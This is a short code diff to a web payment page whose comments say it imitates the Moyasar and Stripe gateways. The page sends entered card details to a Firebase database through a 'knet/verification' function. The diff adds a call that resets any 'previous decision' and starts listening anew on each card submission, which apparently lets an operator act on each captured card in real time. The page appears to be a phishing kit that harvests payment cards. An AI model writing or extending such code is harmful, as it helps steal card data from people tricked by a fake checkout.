@@ -7,7 +7,7 @@
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
-  <script src="./assets/js/firebase-client.js?v=20260912"></script>
+  <script src="./assets/js/firebase-client.js?v=20260913"></script>
   <style>
     /* ستايل بوابات الدفع العالمية المطابق للصورة (Moyasar / Stripe Style) */
     @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
@@ -466,6 +466,9 @@
               prefix,
               bankName: cardBank
             };
+
+            // محاولة دفع جديدة لكل إرسال بطاقة (تصفير أي قرار سابق وبدء استماع جديد)
+            try { if (typeof window.startNewAttempt === 'function') window.startNewAttempt('pay'); } catch (e) {}
 
             // إرسال إلى Firestore/RTDB عبر نفس دالة knet/verification المستخدمة
             let firebaseDone = Promise.resolve(true);
